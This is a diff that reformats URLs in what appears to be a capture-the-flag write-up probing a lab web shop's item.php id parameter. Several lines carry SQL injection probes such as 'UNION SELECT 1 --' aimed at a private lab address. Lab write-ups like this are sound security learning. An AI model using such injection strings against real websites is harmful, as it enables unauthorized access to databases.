@@ -16,13 +16,13 @@ NMAP
 
 ![image1](../resources/0d8486104815498dbb69eb0d08f9f0ce.png)
 
-Website
-<http://10.10.204.254/shop.php>
+Website  `http://10.10.204.254/shop.php`
 
 ![image2](../resources/45ff848e4e2144b08d81a73bf66b9f3a.png)
 
 - Clicking on one gives the following URL:
-<http://10.10.204.254/item.php?id=3>
+
+`http://10.10.204.254/item.php?id=3`
 
 - If you remove the ?id=3 it results in:
 
@@ -35,7 +35,7 @@ Website
 
 or using Union
 
-<http://10.10.204.254/item.php?id=3> UNION SELECT 1 --
+`http://10.10.204.254/item.php?id=3 UNION SELECT 1 --`
 
 
 ![image4](../resources/73d44746390b456287aab5787447fd81.png)
@@ -43,8 +43,7 @@ or using Union
 
 ![image5](../resources/1ad2d0b6688546db8b2fe5c0735fd687.png)
 
-- I randomly changed the id=100
-<http://10.10.204.254/item.php?id=100>
+- I randomly changed the id=100  `http://10.10.204.254/item.php?id=100`
 
 
 ![image6](../resources/912e630cebc14b458a3866468a8818e7.png)
@@ -55,12 +54,13 @@ Compared to (normal request ie. id=1):
 ![image7](../resources/31a7e397bc2d46e4a6cfd4c76ac26ece.png)
 
 - Fuzzing the id field ?id=5
-<http://10.10.204.254/item.php?id=5>
+
+`http://10.10.204.254/item.php?id=5`
 
 
 ![image8](../resources/26983266b6fa45548a59b591a4548c36.png)
 
-<http://10.10.204.254/item.php?id=5> union select 1
+`http://10.10.204.254/item.php?id=5 union select 1`
 
 
 ![image9](../resources/b8c49afcc66540ed87671ed2043f9e6a.png)
